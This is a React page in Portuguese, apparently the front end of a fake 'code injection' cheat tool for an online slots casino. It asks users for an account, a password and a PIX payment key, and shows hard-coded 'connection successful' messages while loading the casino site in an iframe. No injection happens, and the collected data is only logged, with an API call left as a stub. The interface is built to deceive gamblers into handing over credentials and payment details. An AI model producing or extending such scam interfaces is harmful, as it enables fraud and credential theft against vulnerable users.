"use client"

import { useState } from 'react';

export default function Home() {

  const [frame, setFrame] = useState("https://www.google.com/");

  // State to capture input values
  const [formData, setFormData] = useState({
    account: '',
    password: '',
    chavepix: '',
    forceCpu: false
  });

  // Function to handle input changes
  const handleInputChange = (e) => {
    const { name, value, type, checked } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: type === 'checkbox' ? checked : value
    }));
  };

  // Function to handle form submission
  const handleSubmit = (e) => {
    e.preventDefault();
    alert("GERANDO CREDENCIAIS E CAPTURANDO INFORMAÇÕES E VALORES....")
    console.log('Form submitted with values:', formData);
    setFrame("https://play.kkwinpgslots.com/?play=1#/?gameSrc=");
    // Add your submission logic here (e.g., API call)
  };

  return (
    <div className="min-h-screen flex flex-col md:flex-row bg-white">
      {/* Sidebar */}
      <div className="w-full md:w-1/3 lg:w-1/4 bg-[#25006D] text-white p-6 flex flex-col">
        <h2 className="mb-6 text-sm">
          Configure sua conta, para<br />realizar o Inject code na<br />conta informada
        </h2>

        <form onSubmit={handleSubmit}>
          <input
            type="text"
            name="account"
            placeholder="conta"
            value={formData.account}
            onChange={handleInputChange}
            className="mb-4 px-4 py-2 rounded bg-gray-100 text-black focus:outline-none w-full"
          />

          <input
            type="text"
            name="chavepix"
            placeholder="chave-pix (aleatoria)"
            value={formData.account}
            onChange={handleInputChange}
            className="mb-4 px-4 py-2 rounded bg-gray-100 text-black focus:outline-none w-full"
          />

          <input
            type="password"
            name="password"
            placeholder="senha"
            value={formData.password}
            onChange={handleInputChange}
            className="mb-4 px-4 py-2 rounded bg-gray-100 text-black focus:outline-none w-full"
          />

          <label className="flex items-center space-x-2 mb-6">
            <input 
              type="checkbox" 
              name="forceCpu"
              checked={formData.forceCpu}
              onChange={handleInputChange}
              className="w-4 h-4" 
            />
            <span className="text-white text-sm">force-cpu</span>
          </label>

          <button 
            type="submit"
            className="bg-[#7D2CFF] text-white py-2 rounded w-full text-sm"
          >
            SALVAR CONTA
          </button>
        </form>
      </div>

      {/* Main Content */}
      <div className="flex-1 flex flex-col">
        <div className="flex w-full">
          <button className="flex-1 py-3 bg-[#25006D] text-white text-sm">INJECT CODE</button>
          <button className="flex-1 py-3 bg-[#7D2CFF] text-white text-sm">CONFIG ACCOUNT ID</button>
          <button className="flex-1 py-3 bg-[#25006D] text-white text-sm">FORCE INJECT CODE</button>
        </div>

        <div className="flex-1 bg-[#292A2D]">
          <h2 className='text-[1.4em] font-bold text-green-500 p-[10px]'>1. CONEXÃO FEITA COM SUCESSO!</h2>
          <h2 className='text-[1.4em] font-bold text-red-500 p-[10px]'>1/2 AGUARDANDO RESPOSTA DO SERVIDOR! aguarde....</h2>
          <iframe src={frame} className='w-full h-[800px]'></iframe>
        </div>
      </div>
    </div>
  );
}